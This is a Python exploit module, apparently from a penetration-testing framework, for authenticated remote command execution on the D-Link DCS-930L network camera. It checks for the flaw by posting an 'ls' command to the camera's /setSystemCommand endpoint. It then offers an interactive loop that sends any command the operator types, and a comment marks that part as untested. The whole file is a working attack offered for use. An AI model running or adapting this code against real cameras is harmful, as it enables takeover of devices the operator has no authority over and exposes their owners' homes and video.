#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: 'arvin'
import utils
from template.exploit import BaseExploit


class Exploit(BaseExploit):
    __info__ = {
        'name': 'D-Link DCS 930L RCE With Credits',
        'description': 'D-Link DCS 930L allow remote command execute with credits',
        'reference': ['https://www.exploit-db.com/exploits/39437/'],
    }

    prompt = 'dcs_930l_auth_rce'

    def __init__(self):
        super().__init__()

    def check(self, host, port, timeout):
        utils.print_info('Use username: {}, password: {}'.format(self.username, self.password))
        if self.input_to_continue():
            url = "http://{}:{}/setSystemCommand".format(host, port)
            headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
            data = {"ReplySuccessPage": "docmd.htm",
                    "ReplyErrorPage": "docmd.htm",
                    "SystemCommand": "ls",
                    "ConfigSystemCommand": "Save"}

            resp, err = self.http_post(self.s, url, timeout, data, headers=headers, auth=(self.username, self.password))
            if err:
                self.print_requests_err(host, port, err)
            else:
                if resp.status_code == 200 and "ConfigSystemCommand" in resp.text:
                    self.print_check_result(True, host)
                    return True
                elif resp.status_code == 401:
                    utils.print_warning('Credits wrong, login failed')

            self.print_check_result(False, host)
            return False  # target is not vulnerable
        else:
            self.set_credits()
            return self.check(host, port, timeout)

    def run(self, host, port, timeout):
        # TODO NOT TESTING
        utils.print_info('Use username: {}, password: {}'.format(self.username, self.password))
        if self.input_to_continue():
            self.command_loop(host, port, timeout)
        else:
            self.set_credits()
            self.run(host, port, timeout)

    def execute(self, host, port, timeout, cmd):
        url = "http://{}:{}/setSystemCommand".format(host, port)
        headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
        data = {"ReplySuccessPage": "docmd.htm",
                "ReplyErrorPage": "docmd.htm",
                "SystemCommand": cmd,
                "ConfigSystemCommand": "Save"}

        self.http_post(self.s, url, timeout, data, headers=headers, auth=(self.username, self.password))
        return ''
